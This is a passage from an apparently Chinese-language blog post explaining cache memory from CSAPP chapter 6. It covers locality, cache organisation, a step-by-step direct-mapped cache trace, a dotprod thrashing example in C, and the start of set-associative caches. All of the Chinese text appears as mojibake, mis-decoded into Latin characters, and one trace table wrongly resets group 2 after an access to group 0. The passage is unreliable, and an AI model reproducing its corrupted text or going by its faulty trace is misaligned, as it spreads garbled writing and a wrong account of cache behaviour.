title="å­˜å‚¨å™¨ä½“ç³»ç»“æ„æ¦‚å¿µå°èŠ‚"></a>å­˜å‚¨å™¨ä½“ç³»ç»“æ„æ¦‚å¿µå°èŠ‚</h3><p>æ¦‚æ‹¬æ¥è¯´ï¼ŒåŸºäºç¼“å­˜çš„å­˜å‚¨å™¨ä½“ç³»ç»“æ„è¡Œä¹‹æœ‰æ•ˆï¼Œæ˜¯å› ä¸ºè¾ƒæ…¢çš„å­˜å‚¨è®¾å¤‡æ¯”è¾ƒå¿«çš„å­˜å‚¨è®¾å¤‡æ›´ä¾¿å®œï¼Œè¿˜å› ä¸ºç¨‹åºå€¾å‘äºå±•ç¤ºå±€éƒ¨æ€§ï¼š</p><ul><li>åˆ©ç”¨æ—¶é—´å±€éƒ¨æ€§ï¼šç”±äºæ—¶é—´å±€éƒ¨æ€§ï¼ŒåŒä¸€æ•°æ®å¯¹è±¡å¯èƒ½ä¼šè¢«å¤šæ¬¡ä½¿ç”¨ã€‚ä¸€æ—¦ä¸€ä¸ªæ•°æ®å¯¹è±¡åœ¨ç¬¬ä¸€æ¬¡ä¸å‘½ä¸­æ—¶è¢«å¤åˆ¶åˆ°ç¼“å­˜ä¸­ï¼Œæˆ‘ä»¬å°±ä¼šæœŸæœ›åé¢å¯¹è¯¥ç›®æ ‡æœ‰ä¸€ç³»åˆ—çš„è®¿é—®å‘½ä¸­ã€‚å› ä¸ºç¼“å­˜æ¯”ä½ä¸€å±‚çš„å­˜å‚¨è®¾å¤‡æ›´å¿«ï¼Œå¯¹åé¢çš„å‘½ä¸­çš„æœåŠ¡ä¼šæ¯”æœ€å¼€å§‹çš„ä¸å‘½ä¸­å¿«å¾ˆå¤šã€‚</li><li>åˆ©ç”¨ç©ºé—´å±€éƒ¨æ€§ï¼šå—é€šå¸¸åŒ…å«æœ‰å¤šä¸ªæ•°æ®å¯¹è±¡ã€‚ç”±äºç©ºé—´å±€éƒ¨æ€§ï¼Œæˆ‘ä»¬ä¼šæœŸæœ›åé¢å¯¹è¯¥å—ä¸­å…¶ä»–å¯¹è±¡çš„è®¿é—®èƒ½å¤Ÿè¡¥å¿ä¸å‘½ä¸­åå¤åˆ¶è¯¥å—çš„èŠ±è´¹ã€‚</li></ul><h1 id="é«˜é€Ÿç¼“å­˜å­˜å‚¨å™¨"><a href="#é«˜é€Ÿç¼“å­˜å­˜å‚¨å™¨" class="headerlink" title="é«˜é€Ÿç¼“å­˜å­˜å‚¨å™¨"></a>é«˜é€Ÿç¼“å­˜å­˜å‚¨å™¨</h1><p>æ—©æœŸè®¡ç®—æœºç³»ç»Ÿçš„å­˜å‚¨å™¨ç»“æ„å±‚æ¬¡åªæœ‰ä¸‰å±‚ï¼š CPU å¯„å­˜å™¨ã€DRAM ä¸»å­˜å‚¨å™¨å’Œç£ç›˜å­˜å‚¨ã€‚</p><p>éšç€ CPU å’Œä¸»å­˜ä¹‹é—´é€æ¸å¢å¤§çš„å·®è·ï¼Œç³»ç»Ÿè®¾è®¡è€…åœ¨ CPU å¯„å­˜å™¨æ–‡ä»¶å’Œä¸»å­˜ä¹‹é—´æ’å…¥äº†ä¸€ä¸ªå°çš„ SRAM é«˜é€Ÿç¼“å­˜å­˜å‚¨å™¨ï¼Œç§°ä¸º L1 é«˜é€Ÿç¼“å­˜ï¼ˆä¸€çº§ç¼“å­˜ï¼‰ã€‚è€Œåä¸€çº§ç¼“å­˜ä¹Ÿæ— æ³•å¼¥è¡¥æ€§èƒ½ä¹‹é—´çš„å·®è·ï¼Œç¨‹åºè®¾è®¡è€…åˆåœ¨ L1 é«˜é€Ÿç¼“å­˜å’Œä¸»å­˜ä¹‹é—´æ’å…¥äº†ä¸€ä¸ªæ›´å¤§çš„é«˜é€Ÿç¼“å­˜ï¼Œç§°ä¸º L2 é«˜é€Ÿç¼“å­˜ã€‚æœ‰äº›ç°ä»£ç³»ç»Ÿè¿˜åŒ…æ‹¬ä¸€ä¸ªæ¯” L2 æ›´å¤§çš„é«˜é€Ÿç¼“å­˜ L3 é«˜é€Ÿç¼“å­˜ã€‚</p><p>æ¥ä¸‹æ¥çš„ç« èŠ‚ä¸­éƒ½æ˜¯ä»¥åªæœ‰ä¸€ä¸ª L1 é«˜é€Ÿç¼“å­˜çš„æƒ…å†µæ¥å­¦ä¹ çš„ã€‚</p><h3 id="é€šç”¨çš„é«˜é€Ÿç¼“å­˜å­˜å‚¨å™¨ç»„ç»‡ç»“æ„"><a href="#é€šç”¨çš„é«˜é€Ÿç¼“å­˜å­˜å‚¨å™¨ç»„ç»‡ç»“æ„" class="headerlink" title="é€šç”¨çš„é«˜é€Ÿç¼“å­˜å­˜å‚¨å™¨ç»„ç»‡ç»“æ„"></a>é€šç”¨çš„é«˜é€Ÿç¼“å­˜å­˜å‚¨å™¨ç»„ç»‡ç»“æ„</h3><p>é«˜é€Ÿç¼“å­˜çš„ç»„ç»‡å¦‚ä¸‹ï¼š</p><p>ä¸€ä¸ªæœºå™¨çš„é«˜é€Ÿç¼“å­˜ç»„è¢«ç»„ç»‡ä¸ºä¸€ä¸ªæœ‰ $$S &#x3D;2^s$$ ä¸ªé«˜é€Ÿç¼“å­˜ç»„çš„æ•°ç»„ï¼Œæ¯ä¸ªç»„åŒ…å« E ä¸ªé«˜é€Ÿç¼“å­˜è¡Œã€‚æ¯è¡Œæœ‰ä¸€ä¸ª $$B&#x3D;2^b$$ å­—èŠ‚çš„<strong>æ•°æ®å—</strong>ç»„æˆã€‚ä¸€ä¸ª<strong>æœ‰æ•ˆä½</strong>æŒ‡æ˜è¿™ä¸ªè¡Œæ˜¯å¦åŒ…å«æœ‰æ„ä¹‰çš„ä¿¡æ¯ï¼Œè¿˜æœ‰ <code>t=m-(b+s)â€‹</code> ä¸ª<strong>æ ‡è®°ä½</strong>å”¯ä¸€çš„æ ‡è¯†å­˜å‚¨åœ¨è¿™ä¸ªé«˜é€Ÿç¼“å­˜ä¸­çš„å—ã€‚</p><p>ä¸€èˆ¬è€Œè¨€ï¼Œé«˜é€Ÿç¼“å­˜çš„ç»“æ„å¯ä»¥ç”¨å…ƒç»„ <code>(S,E,B,m)</code> æ¥æè¿°ï¼Œé«˜é€Ÿç¼“å­˜çš„å¤§å°ï¼ˆæˆ–è€…å®¹é‡ï¼‰CæŒ‡çš„æ˜¯æ‰€æœ‰å—å¤§å°çš„å’Œï¼Œæ ‡è®°ä¸ºå’Œæœ‰æ•ˆä½å¹¶ä¸åŒ…æ‹¬åœ¨å†…ï¼Œæ‰€ä»¥ <code>C=SxExB</code>ã€‚</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%85%AD%E7%AB%A0-%E5%AD%98%E5%82%A8%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/6-%E9%AB%98%E9%80%9F%E7%BC%93%E5%AD%98.png"></p><p> é‚£ä¹ˆé«˜é€Ÿç¼“å­˜æ˜¯å¦‚ä½•å·¥ä½œçš„å‘¢ï¼Ÿ</p><blockquote><p>è¿˜æ˜¯æ„Ÿè§‰ä¹¦ä¸Šè¯´çš„å¾ˆéš¾æ‡‚</p></blockquote><p>å¦‚ä¸Šå›¾ (b) ï¼Œæˆ‘ä»¬çš„ä¸€ä¸ªå®Œæ•´çš„å†…å­˜åœ°å€å…±æœ‰ m ä½ï¼Œè¿™ m ä½è¢«åˆ†ä¸ºä¸‰ä¸ªå­—æ®µï¼Œåˆ†åˆ«æ˜¯ï¼šç»„ç´¢å¼•ä½ï¼ˆsä½ï¼‰ã€æ ‡è®°ä½ï¼ˆtä½ï¼‰å’Œå—åç§»ä½ï¼ˆbä½ï¼‰ã€‚</p><ul><li><strong>ç»„ç´¢å¼•ä½</strong>ï¼ˆsä½ï¼‰ï¼šç»„ç´¢å¼•ä½ç”¨äºç¡®å®šæ•°æ®åº”è¯¥å­˜å‚¨åœ¨å“ªä¸ªç»„ï¼ˆgroupï¼‰ä¸­ã€‚è¿™é‡Œæœ‰Sä¸ªç»„ï¼Œç´¢å¼•å€¼ä» 0 å¼€å§‹ç¼–å·ï¼Œæ¯ä¸ªç»„åŒ…å«å¤šä¸ªç¼“å­˜è¡Œã€‚</li><li><strong>æ ‡è®°ä½</strong>ï¼ˆtä½ï¼‰ï¼šæ ‡è®°ä½ç”¨äºç¡®å®šæ¯ä¸ªç¼“å­˜è¡Œçš„å†…å®¹æ˜¯å¦ä¸è®¿é—®çš„åœ°å€æ‰€éœ€æ•°æ®åŒ¹é…ã€‚å¦‚æœç¼“å­˜è¡Œä¸­å­˜å‚¨çš„æ•°æ®ä¸è®¿é—®çš„æ•°æ®ç›¸åŒ¹é…ï¼Œå¹¶ä¸”æœ‰æ•ˆä½è¢«è®¾ç½®ï¼Œåˆ™è¡¨ç¤ºå‘½ä¸­äº†ç¼“å­˜ã€‚</li><li><strong>å—åç§»ä½</strong>ï¼ˆbä½ï¼‰ï¼šå—åç§»ä½ç”¨äºç¡®å®šç¼“å­˜è¡Œä¸­çš„å“ªä¸ªå­—èŠ‚å­˜å‚¨äº†éœ€è¦çš„æ•°æ®ï¼Œå› ä¸ºæ¯ä¸ªç¼“å­˜è¡Œå¤§å°ä¸ºBå­—èŠ‚ã€‚</li></ul><p>å½“ CPU è¯·æ±‚æ•°æ®æ—¶ï¼Œåœ°å€è¢«åˆ†è§£ä¸ºç»„ç´¢å¼•ã€æ ‡è®°å’Œå—åç§»ä½ã€‚é¦–å…ˆä½¿ç”¨ç»„ç´¢å¼•ä½æ‰¾åˆ°å¯¹åº”çš„ç»„ï¼Œç„¶ååœ¨è¯¥ç»„ä¸­æŸ¥æ‰¾æ ‡è®°ä½åŒ¹é…çš„ç¼“å­˜è¡Œï¼Œå¦‚æœæ‰¾åˆ°åŒ¹é…çš„è¡Œå¹¶ä¸”æœ‰æ•ˆä½è¢«è®¾ç½®ï¼Œåˆ™è¡¨ç¤ºç¼“å­˜å‘½ä¸­ï¼ŒCPUå¯ä»¥ç›´æ¥ä»ç¼“å­˜ä¸­è·å–æ•°æ®ã€‚</p><h3 id="ç›´æ¥æ˜ å°„é«˜é€Ÿç¼“å­˜"><a href="#ç›´æ¥æ˜ å°„é«˜é€Ÿç¼“å­˜" class="headerlink" title="ç›´æ¥æ˜ å°„é«˜é€Ÿç¼“å­˜"></a>ç›´æ¥æ˜ å°„é«˜é€Ÿç¼“å­˜</h3><p>æ ¹æ®æ¯ä¸ªç»„çš„é«˜é€Ÿç¼“å­˜è¡Œæ•° E ï¼Œé«˜é€Ÿç¼“å­˜è¢«åˆ†ä¸ºä¸åŒçš„ç±»ã€‚å…¶ä¸­<strong>æ¯ä¸€ç»„åªæœ‰ä¸€è¡Œçš„é«˜é€Ÿç¼“å­˜ç§°ä¸ºç›´æ¥æ˜ å°„é«˜é€Ÿç¼“å­˜</strong>ã€‚</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%85%AD%E7%AB%A0-%E5%AD%98%E5%82%A8%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/6-%E7%9B%B4%E6%8E%A5%E6%98%A0%E5%B0%84%E9%AB%98%E9%80%9F%E7%BC%93%E5%AD%98.png"></p><p>é«˜é€Ÿç¼“å­˜ç¡®å®šä¸€ä¸ªè¯·æ±‚æ˜¯å¦å‘½ä¸­ï¼Œç„¶åæŠ½å–å‡ºè¢«è¯·æ±‚çš„å­—çš„è¿‡ç¨‹åˆ†ä¸ºä¸‰æ­¥ï¼š1ï¼‰ç»„é€‰æ‹©ã€2ï¼‰è¡ŒåŒ¹é…ã€3ï¼‰å­—æŠ½å–</p><h4 id="ç»„é€‰æ‹©"><a href="#ç»„é€‰æ‹©" class="headerlink" title="ç»„é€‰æ‹©"></a>ç»„é€‰æ‹©</h4><p>ç»„é€‰æ‹©å…ˆå±è”½æ‰ä½ b ä½çš„å—åç§»ä¹‹åï¼Œå–å¾—ä½ s ä½ï¼Œè¿™ä¸ªæ•°å€¼å°±æ˜¯ç»„å·ã€‚å¦‚æœæˆ‘ä»¬æŠŠé«˜é€Ÿç¼“å­˜çœ‹ä½œæ˜¯ä¸€ä¸ªå…³äºç»„çš„ä¸€ç»´æ•°ç»„ï¼Œé‚£ä¹ˆè¿™äº›ç»„çš„ç´¢å¼•ä½å°±æ˜¯è¿™ä¸ªå¯¹åº”åœ¨æ•°ç»„çš„ç´¢å¼•ã€‚</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%85%AD%E7%AB%A0-%E5%AD%98%E5%82%A8%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/6-%E7%BB%84%E9%80%89%E6%8B%A9.png"></p><h4 id="è¡ŒåŒ¹é…"><a href="#è¡ŒåŒ¹é…" class="headerlink" title="è¡ŒåŒ¹é…"></a>è¡ŒåŒ¹é…</h4><p>å–å¾—é«˜ t ä½ï¼Œåªæœ‰è¿™ä¸€ä½å’Œæ ‡è®°ä½å®Œå…¨å¯¹åº”ä¸Šæ‰è¯´æ˜ cache è¡Œé‡Œé¢è£…çš„æ˜¯æˆ‘ä»¬æƒ³è¦çš„æ•°æ®ã€‚</p><h4 id="å­—é€‰æ‹©"><a href="#å­—é€‰æ‹©" class="headerlink" title="å­—é€‰æ‹©"></a>å­—é€‰æ‹©</h4><p>ä¸€æ—¦å‰ä¸¤ä¸ªæ­¥éª¤å‘½ä¸­ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ ¹æ®å—åç§»æ¥ç¡®å®šå­—çš„ä½ç½®äº†</p><p>è¡ŒåŒ¹é…å’Œå­—é€‰æ‹©çš„æµç¨‹å¦‚ä¸‹å›¾ï¼š</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%85%AD%E7%AB%A0-%E5%AD%98%E5%82%A8%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/6-%E8%A1%8C%E5%8C%B9%E9%85%8D.png"></p><h4 id="ä¸å‘½ä¸­æ—¶çš„è¡Œæ›¿æ¢"><a href="#ä¸å‘½ä¸­æ—¶çš„è¡Œæ›¿æ¢" class="headerlink" title="ä¸å‘½ä¸­æ—¶çš„è¡Œæ›¿æ¢"></a>ä¸å‘½ä¸­æ—¶çš„è¡Œæ›¿æ¢</h4><p>å¦‚æœç¼“å­˜ä¸å‘½ä¸­ï¼Œé‚£ä¹ˆå®ƒéœ€è¦ä»å­˜å‚¨å™¨ä½“ç³»ç»“æ„ä¸­çš„ä¸‹ä¸€å±‚å–å‡ºè¢«è¯·æ±‚çš„å—ï¼Œç„¶åå°†æ–°çš„å—å­˜å‚¨åœ¨ç»„ç´¢å¼•ä½æŒ‡ç¤ºçš„ç»„ä¸­çš„ä¸€ä¸ªé«˜é€Ÿç¼“å­˜è¡Œä¸­ã€‚å¯¹äºç›´æ¥æ˜ å°„é«˜é€Ÿç¼“å­˜æ¥è¯´ï¼Œæ¯ä¸ªç»„åªåŒ…å«æœ‰ä¸€è¡Œï¼Œæ›¿æ¢ç­–ç•¥éå¸¸ç®€å•ï¼šç”¨æ–°å–å‡ºçš„è¡Œæ›¿æ¢å½“å‰çš„è¡Œã€‚</p><h4 id="è¿è¡Œä¸­çš„ç›´æ¥æ˜ å°„é«˜é€Ÿç¼“å­˜"><a href="#è¿è¡Œä¸­çš„ç›´æ¥æ˜ å°„é«˜é€Ÿç¼“å­˜" class="headerlink" title="è¿è¡Œä¸­çš„ç›´æ¥æ˜ å°„é«˜é€Ÿç¼“å­˜"></a>è¿è¡Œä¸­çš„ç›´æ¥æ˜ å°„é«˜é€Ÿç¼“å­˜</h4><p>å‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ªç›´æ¥æ˜ å°„é«˜é€Ÿç¼“å­˜ï¼Œ<code>(S,E,B,m)=(4,1,2,4)</code>ï¼Œé«˜é€Ÿç¼“å­˜æœ‰ 4 ä¸ªç»„ï¼Œæ¯ä¸ªç»„ä¸€è¡Œï¼Œæ¯ä¸ªå— 2 ä¸ªå­—èŠ‚ï¼Œè€Œåœ°å€æ˜¯4 ä½çš„ã€‚</p><p>æˆ‘ä»¬è¿™é‡Œç”¨åˆ—è¡¨æ¥æ¨¡æ‹Ÿé«˜é€Ÿç¼“å­˜ï¼Œå¯ä»¥å°†æ‰€æœ‰çš„åœ°å€éƒ½åˆ—å‡ºæ¥ï¼š</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%85%AD%E7%AB%A0-%E5%AD%98%E5%82%A8%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/6-%E8%BF%90%E8%A1%8C%E4%B8%AD%E7%9A%84%E9%AB%98%E9%80%9F%E7%BC%93%E5%AD%98-%E5%9C%B0%E5%9D%80.png"></p><p>åœ¨æœ€å¼€å§‹çš„æ—¶å€™ï¼Œé«˜é€Ÿç¼“å­˜éƒ½æ˜¯ç©ºçš„ï¼š</p><table><thead><tr><th>ç»„</th><th>æœ‰æ•ˆä½</th><th>æ ‡è®°ä½</th><th>å—[0]</th><th>å—[1]</th></tr></thead><tbody><tr><td>0</td><td>0</td><td></td><td></td><td></td></tr><tr><td>1</td><td>0</td><td></td><td></td><td></td></tr><tr><td>2</td><td>0</td><td></td><td></td><td></td></tr><tr><td>3</td><td>0</td><td></td><td></td><td></td></tr></tbody></table><blockquote><p>â€ç»„â€œè¿™ä¸€åˆ—ä¸æ˜¯é«˜é€Ÿç¼“å­˜çš„ä¸€éƒ¨åˆ†ï¼Œåå››åˆ—æ‰æ˜¯é«˜é€Ÿç¼“å­˜å®é™…çš„ä½</p></blockquote><p>CPU åœ¨æ‰§è¡Œè¯»æ“ä½œæ—¶ï¼Œä¼šå‘ç”Ÿä»¥ä¸‹å‡ ä¸ªæ­¥éª¤ï¼š</p><p><strong>è¯»åœ°å€ 0 çš„å­—</strong>ï¼š</p><p>ç»„ 0 çš„æœ‰æ•ˆä½ä¸º 0 ï¼Œç¼“å­˜ä¸å‘½ä¸­ï¼Œæ‰§è¡Œæ›¿æ¢ç­–ç•¥ã€‚é«˜é€Ÿç¼“å­˜ä»å†…å­˜ä¸­å–å‡ºå— 0 ï¼Œå¹¶æŠŠè¿™ä¸ªå—å­˜å‚¨åœ¨ç»„ 0 ä¸­ã€‚ç„¶åé«˜é€Ÿç¼“å­˜æ–°å»é™¤çš„å—çš„ m[0] ã€‚</p><table><thead><tr><th>ç»„</th><th>æœ‰æ•ˆä½</th><th>æ ‡è®°ä½</th><th>å—[0]</th><th>å—[1]</th></tr></thead><tbody><tr><td>0</td><td>1</td><td>0</td><td>m[0]</td><td>m[1]</td></tr><tr><td>1</td><td>0</td><td></td><td></td><td></td></tr><tr><td>2</td><td>0</td><td></td><td></td><td></td></tr><tr><td>3</td><td>0</td><td></td><td></td><td></td></tr></tbody></table><p><strong>è¯»åœ°å€ 1 çš„å­—</strong>ï¼š</p><p>é«˜é€Ÿç¼“å­˜å‘½ä¸­ï¼Œç«‹å³ä»é«˜é€Ÿç¼“å­˜è¡Œä¸­çš„å—[1]ä¸­è¿”å› m[1] ã€‚é«˜é€Ÿç¼“å­˜çš„çŠ¶æ€æ²¡æœ‰å˜åŒ–ã€‚</p><p><strong>è¯»åœ°å€ 13 çš„å­—ï¼š</strong></p><p>è¯»åœ°å€ 13 çš„å­—ï¼Œæ‰¾åˆ°ç»„ 2ï¼Œæœ‰æ•ˆä½ä¸º 0ï¼Œæ‰§è¡Œæ›¿æ¢ç­–ç•¥ã€‚</p><table><thead><tr><th>ç»„</th><th>æœ‰æ•ˆä½</th><th>æ ‡è®°ä½</th><th>å—[0]</th><th>å—[1]</th></tr></thead><tbody><tr><td>0</td><td>1</td><td>0</td><td>m[0]</td><td>m[1]</td></tr><tr><td>1</td><td>0</td><td></td><td></td><td></td></tr><tr><td>2</td><td>1</td><td>1</td><td>m[12]</td><td>m[13]</td></tr><tr><td>3</td><td>0</td><td></td><td></td><td></td></tr></tbody></table><p><strong>è¯»åœ°å€ 8 çš„å­—</strong></p><p>è¯»åœ°å€ 8 çš„å­—ï¼Œæ‰¾åˆ°ç»„ 0ï¼Œæœ‰æ•ˆä½ä¸º 1ï¼Œæ ‡è®°ä½æ²¡æœ‰å¯¹ä¸Šï¼Œå‘ç”Ÿä¸å‘½ä¸­ï¼Œæ‰§è¡Œæ›¿æ¢ç­–ç•¥ã€‚</p><table><thead><tr><th>ç»„</th><th>æœ‰æ•ˆä½</th><th>æ ‡è®°ä½</th><th>å—[0]</th><th>å—[1]</th></tr></thead><tbody><tr><td>0</td><td>1</td><td>1</td><td>m[8]</td><td>m[9]</td></tr><tr><td>1</td><td>0</td><td></td><td></td><td></td></tr><tr><td>2</td><td>1</td><td>1</td><td>m[12]</td><td>m[13]</td></tr><tr><td>3</td><td>0</td><td></td><td></td><td></td></tr></tbody></table><p><strong>è¯»åœ°å€ 0 çš„å­—</strong>ï¼š</p><p>ç¼“å­˜ä¸å‘½ä¸­ï¼Œå› ä¸ºæˆ‘ä»¬å‰é¢æ›¿æ¢äº†å— 0 ã€‚</p><table><thead><tr><th>ç»„</th><th>æœ‰æ•ˆä½</th><th>æ ‡è®°ä½</th><th>å—[0]</th><th>å—[1]</th></tr></thead><tbody><tr><td>0</td><td>1</td><td>0</td><td>m[0]</td><td>m[1]</td></tr><tr><td>1</td><td>0</td><td></td><td></td><td></td></tr><tr><td>2</td><td>0</td><td></td><td>m[12]</td><td>m[13]</td></tr><tr><td>3</td><td>0</td><td></td><td></td><td></td></tr></tbody></table><h4 id="å†²çªä¸å‘½ä¸­-1"><a href="#å†²çªä¸å‘½ä¸­-1" class="headerlink" title="å†²çªä¸å‘½ä¸­"></a>å†²çªä¸å‘½ä¸­</h4><p>åœ¨ç›´æ¥æ˜ å°„é«˜é€Ÿç¼“å­˜ä¸­ï¼ŒåŒä¸€ç»„çš„ä¸åŒè¡Œå¤šæ¬¡è¢«åå¤è®¿é—®ï¼Œä¼šå¯¼è‡´ç›´æ¥æ˜ å°„é«˜é€Ÿç¼“å­˜ä¸€ç›´ä¸å‘½ä¸­ï¼ˆå› ä¸ºåªæœ‰ä¸€è¡Œï¼Œæ¯æ¬¡éƒ½éœ€è¦æ›¿æ¢ï¼‰ã€‚ä¾‹å¦‚ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">float</span> <span class="hljs-title function_">dotprod</span><span class="hljs-params">(<span class="hljs-type">float</span> x[<span class="hljs-number">8</span>],<span class="hljs-type">float</span> y[<span class="hljs-number">8</span>])</span><br>&#123;<br>    <span class="hljs-type">float</span> sum=<span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> i;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">8</span>;i++)<br>    &#123;<br>        sum+=x[i]*y[i];<br>    &#125;<br>    <span class="hljs-keyword">return</span> sum;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªç¨‹åºçœ‹èµ·æ¥æ˜¯å…·æœ‰å¾ˆå¥½çš„å±€éƒ¨æ€§çš„ï¼Œä½†äº‹å®ä¸Šæœ‰å¯èƒ½ <code>x[i]</code> ä¸ <code>y[i]</code> çš„ç»„å·æ°¸è¿œç›¸åŒã€‚</p><p>å‡è®¾ cache è¡Œçš„è¡Œé•¿ä¸º 4ï¼Œx æ•°ç»„ä¸ y æ•°ç»„åœ°å€ç´§é‚»ï¼Œé‚£ä¹ˆå°±ä¼šå‡ºç°è¿™ç§æƒ…å†µï¼š</p><p>å¾ªç¯çš„ç¬¬ä¸€æ¬¡è¿­ä»£å¼•ç”¨ x[0]ï¼Œç¼“å­˜ä¸å‘½ä¸­ä¼šå¯¼è‡´åŒ…å« x[0]<del>x[3] çš„å—è¢«åŠ è½½åˆ°ç»„ 0ã€‚æ¥ä¸‹æ¥æ˜¯å¯¹ y[0] çš„å¼•ç”¨ï¼Œåˆä¸€æ¬¡ç¼“å­˜ä¸å‘½ä¸­ï¼Œå¯¼è‡´åŒ…å« y[0]</del>y[3]çš„å—è¢«å¤åˆ¶åˆ°ç»„ 0ï¼Œè¦†ç›–å‰ä¸€æ¬¡å¼•ç”¨å¤åˆ¶è¿›æ¥çš„ x çš„å€¼ã€‚ç°åœ¨æˆ‘ä»¬æœ‰ä¸€ä¸ªå†²çªä¸å‘½ä¸­ï¼Œè€Œä¸”å®é™…ä¸Šåé¢æ¯æ¬¡å¯¹ x å’Œ yçš„å¼•ç”¨éƒ½ä¼šå¯¼è‡´å†²çªä¸å‘½ä¸­ï¼Œè¿™ç§æƒ…å†µæˆ‘ä»¬å«<strong>æŠ–åŠ¨</strong>ï¼Œå› ä¸ºæ¯æ¬¡å¾ªç¯ï¼Œå®ƒä¸€ç›´åœ¨ x å’Œ y ä¹‹é—´æ¥å›è®¿é—®ã€‚</p><p>æˆ‘ä»¬çš„ä¿®æ­£æ€è·¯ä¹Ÿå¾ˆå®¹æ˜“ï¼Œåªéœ€è¦åœ¨ x æ•°ç»„ä¹‹åå¡«å……ä¸Š B ä¸ªå­—èŠ‚ï¼ˆä¾‹å¦‚æŠŠ float[8] å®šä¹‰ä¸º float[12] ï¼‰ï¼Œè®©å®ƒä»¬æ˜ å°„åˆ°ä¸åŒç»„å½“ä¸­å³å¯è§£å†³é—®é¢˜ã€‚</p><h4 id="ç´¢å¼•ä½åœ¨ä¸­é—´ä½çš„åŸå› "><a href="#ç´¢å¼•ä½åœ¨ä¸­é—´ä½çš„åŸå› " class="headerlink" title="ç´¢å¼•ä½åœ¨ä¸­é—´ä½çš„åŸå› "></a>ç´¢å¼•ä½åœ¨ä¸­é—´ä½çš„åŸå› </h4><p><img src="/img/CSAPP-%E7%AC%AC%E5%85%AD%E7%AB%A0-%E5%AD%98%E5%82%A8%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/6-%E7%B4%A2%E5%BC%95%E4%BD%8D.png"></p><p>é«˜ä½åšç´¢å¼•çš„è¯ï¼Œä¸€äº›è¿ç»­çš„å†…å­˜å—å°±ä¼šæ˜ å°„åˆ°ç›¸åŒçš„é«˜é€Ÿç¼“å­˜å¿«ã€‚è€Œç›¸æ¯”è¾ƒè€Œè¨€ï¼Œç›¸é‚»çš„å¿«æ€»æ˜¯æ˜ å°„åˆ°ä¸åŒçš„é«˜é€Ÿç¼“å­˜ä¸­ã€‚è€Œä¸­é—´ä½ç´¢å¼•çš„å‘½ä¸­ç‡ç›¸è¾ƒé«˜ä½ç´¢å¼•ä¹Ÿè¦é«˜å¾—å¤šã€‚</p><h3 id="ç»„ç›¸è”é«˜é€Ÿç¼“å­˜"><a href="#ç»„ç›¸è”é«˜é€Ÿç¼“å­˜" class="headerlink" title="ç»„ç›¸è”é«˜é€Ÿç¼“å­˜"></a>ç»„ç›¸è”é«˜é€Ÿç¼“å­˜</h3><p>ç›´æ¥æ˜ å°„é«˜é€Ÿç¼“å­˜ä¸­å†²çªä¸å‘½ä¸­é€ æˆçš„é—®é¢˜æºäºæ¯ä¸ªç»„åªæœ‰ä¸€è¡Œï¼Œç»„ç›¸è”é«˜é€Ÿç¼“å­˜ï¼ˆset associative cacheï¼‰æ”¾æ¾äº†è¿™æ¡é™åˆ¶ï¼Œæ‰€ä»¥æ¯ä¸ªç»„éƒ½ä¿å­˜æœ‰å¤šäºä¸€ä¸ªçš„é«˜é€Ÿç¼“å­˜è¡Œã€‚ä¸€ä¸ª<code>1&lt;E&lt;C/B</code> çš„é«˜é€Ÿç¼“å­˜é€šå¸¸ç§°ä¸º E è·¯ç»„ç›¸è”é«˜é€Ÿç¼“å­˜ã€‚</p><p>å¦‚ä¸‹å›¾æ˜¯ E&#x3D;2 çš„ç»„ç›¸è”é«˜é€Ÿç¼“å­˜ï¼š</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%85%AD%E7%AB%A0-%E5%AD%98%E5%82%A8%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/6-%E7%BB%84%E7%9B%B8%E8%81%94%E9%AB%98%E9%80%9F%E7%BC%93%E5%AD%98.png"></p><h4 id="ç»„é€‰æ‹©-1"><a href="#ç»„é€‰æ‹©-1" class="headerlink" title="ç»„é€‰æ‹©"></a>ç»„é€‰æ‹©</h4><p>å’Œç›´æ¥æ˜ å°„é«˜é€Ÿç¼“å­˜ç»„ä¸€æ ·</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%85%AD%E7%AB%A0-%E5%AD%98%E5%82%A8%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/6-%E7%BB%84%E7%9B%B8%E8%81%94%E7%BB%84%E9%80%89%E6%8B%A9.png"></p><h4 id="è¡ŒåŒ¹é…å’Œå­—é€‰æ‹©"><a href="#è¡ŒåŒ¹é…å’Œå­—é€‰æ‹©" class="headerlink" title="è¡ŒåŒ¹é…å’Œå­—é€‰æ‹©"></a>è¡ŒåŒ¹é…å’Œå­—é€‰æ‹©</h4><p>è¡ŒåŒ¹é…éœ€è¦æ£€æŸ¥å¤šä¸ªè¡Œçš„æœ‰æ•ˆä½å’Œæ ‡è®°ä½ã€‚</p><p>ç›¸è”å­˜å‚¨å™¨æ˜¯ä¸€ä¸ª <code>(key,value)</code> å¯¹çš„æ•°ç»„ï¼Œä»¥ key ä¸ºè¾“å…¥ï¼Œè¿”å›ä¸è¾“å…¥çš„ key ç›¸åŒ¹é…çš„ <code>(key,value)</code> å¯¹ä¸­çš„ value å€¼ã€‚å› 